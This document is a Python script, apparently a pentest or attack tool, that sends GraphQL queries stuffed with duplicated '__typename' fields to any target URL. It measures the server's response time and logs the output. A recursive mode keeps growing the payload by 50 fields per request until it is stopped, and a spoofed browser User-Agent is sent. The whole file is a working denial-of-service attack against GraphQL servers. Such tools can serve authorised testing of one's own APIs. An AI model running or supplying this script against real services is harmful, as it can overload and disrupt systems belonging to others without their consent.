import requests
import argparse
import time

def generate_field_duplication_query(num_fields):
    """Generate GraphQL query with field duplication overloading."""
    fields = "\n".join(["__typename" for _ in range(num_fields)])
    return {
        "query": f"query zeny {{ {fields} }}",
        "operationName": "zeny"
    }

def send_graphql_request(target_url, num_fields, output_file):
    """Send the GraphQL field duplication request and log the response."""
    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Connection": "keep-alive"
    }

    payload = generate_field_duplication_query(num_fields)
    start_time = time.time()
    try:
        response = requests.post(target_url, json=payload, headers=headers, timeout=10)
        response_time = round(time.time() - start_time, 2)
        
        print(f"\n[+] Sent request to: {target_url}")
        print(f"[+] Field Duplication Size: {num_fields}")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Time: {response_time} seconds")
        print("[+] Response:\n", response.text)

        if output_file:
            with open(output_file, "a") as f:
                f.write(f"\n[+] Sent request to: {target_url}\n")
                f.write(f"[+] Field Duplication Size: {num_fields}\n")
                f.write(f"[+] Status Code: {response.status_code}\n")
                f.write(f"[+] Response Time: {response_time} seconds\n")
                f.write("[+] Response:\n" + response.text + "\n" + "-"*50 + "\n")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GraphQL Field Duplication Overloading Tool")
    parser.add_argument("-u", "--url", required=True, help="Target website URL")
    parser.add_argument("-p", "--path", required=True, help="GraphQL endpoint path (e.g., /graphql, /api/graphql)")
    parser.add_argument("-f", "--fields", type=int, default=10, help="Number of duplicated fields (default: 10)")
    parser.add_argument("-r", "--recursive", action="store_true", help="Enable recursive mode (increase fields by 50 until interrupted)")
    parser.add_argument("-o", "--output", help="File to store responses")

    args = parser.parse_args()
    full_url = args.url.rstrip("/") + "/" + args.path.lstrip("/")

    if args.recursive:
        print("[+] Recursive mode enabled. Press Ctrl+C to stop.")
        field_count = args.fields
        try:
            while True:
                send_graphql_request(full_url, field_count, args.output)
                field_count += 50
        except KeyboardInterrupt:
            print("\n[+] Stopping recursive requests.")
    else:
        send_graphql_request(full_url, args.fields, args.output)
